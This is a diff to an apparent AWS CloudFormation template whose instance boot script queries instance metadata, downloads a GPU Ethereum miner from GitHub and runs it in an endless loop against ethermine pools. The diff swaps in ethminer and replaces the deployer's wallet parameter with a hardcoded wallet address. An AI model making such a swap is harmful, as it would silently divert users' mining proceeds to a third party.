@@ -86,7 +86,7 @@ Mappings:
     sa-east-1:
       ImageId: ami-048837a0bfc1ba1a6
     us-east-1:
-      ImageId: ami-063585f0e06d22308
+      ImageId: ami-0b70285e5215b80eb
     us-east-2:
       ImageId: ami-01bd6a1621a6968d7
     us-west-1:
@@ -153,15 +153,14 @@ Resources:
                 cd /tmp
                 INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id | cut -b-8)
                 AZ_ID=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone-id)
-                wget -O lolminer.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
-                tar xvfz lolminer.tar.gz
-                cd 1.31
+                wget -O miner.tar.gz https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
+                tar xvfz miner.tar.gz
+                cd bin
                 cat > runner.sh << __EOF__
                 #!/bin/bash -x
                 SERVERS=(us1 us2 eu1 asia1)
                 while (true); do
-                  ./lolMiner --algo ETHASH --pool us1.ethermine.org:5555 --tls on --user ${EthWallet}.${!INSTANCE_ID}-${!AZ_ID}
-                  ./lolMiner --algo ETHASH --pool us2.ethermine.org:5555 --tls on --user ${EthWallet}.${!INSTANCE_ID}-${!AZ_ID}
+                  ./ethminer -G -P stratum1+tcp://0x834112E5A3adEc466d60e67468EE3D061F3F0139.${!INSTANCE_ID}-${!AZ_ID}@us1.ethermine.org:4444
                 done
                 __EOF__
                 chmod +x runner.sh
